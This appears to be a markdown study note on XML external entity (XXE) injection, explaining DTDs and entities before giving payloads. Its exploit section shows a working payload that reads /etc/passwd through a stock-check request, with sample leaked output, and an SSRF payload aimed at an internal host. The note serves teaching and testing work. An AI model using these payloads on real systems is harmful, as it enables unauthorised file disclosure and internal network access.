# XXE (XML external entity) injection

XXE (XML External Entity) is a vulnerability that occurs when an attacker can manipulate or inject malicious XML content into an application, leading to the potential disclosure of sensitive information or denial of service. This typically happens when the application processes XML input from untrusted sources without proper validation, allowing attackers to exploit the XML parsing functionality to their advantage.

### Table of content 

- [XML](#xml)
    - [Document type definition](#document-type-definition)
    - [XML entities](#xml-entities)
- **Exploit**
    - [Retrieve files](#retrieve-files)
    - [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
## XML

XML (Extensible Markup Language) is a versatile and structured markup language used for storing, transporting, and exchanging data. It's known for its human-readable format and plays a critical role in various web technologies and data storage solutions. Its popularity has now declined in favor of the JSON format.

### Document type definition

A Document Type Definition (DTD) in XML is a declaration that defines the structure and the legal elements and attributes of an XML document. It provides a set of rules for validating the structure and content of the XML document, ensuring that it conforms to a specific format or schema.

### XML entities

XML entities are placeholders used within an XML document to represent and reference data, enabling the reuse and organization of content. They are commonly employed to manage and structure data effectively in XML documents.

#### Default entities

Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and >. These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data.

#### Custom entities

```html
<!DOCTYPE bookInfo [
  <!ENTITY bookTitle "Harry Potter and the Philosopher's Stone">
]>
<book>
  <title>&bookTitle;</title>
  <author>J.K. Rowling</author>
</book>
```

#### External entities

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:

```html
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
```

The URL can use the file:// protocol, and so external entities can be loaded from file. For example:

```html
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

## Exploit

## Retrieve files

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

- Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server:

```html
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file:

```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

## Exploiting XXE to perform SSRF attacks

To exploit an XXE vulnerability to perform an SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value. If you can use the defined entity within a data value that is returned in the application's response, then you will be able to view the response from the URL within the application's response, and so gain two-way interaction with the back-end system.

```html
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

---

[**:arrow_right_hook: Back home**](/README.md)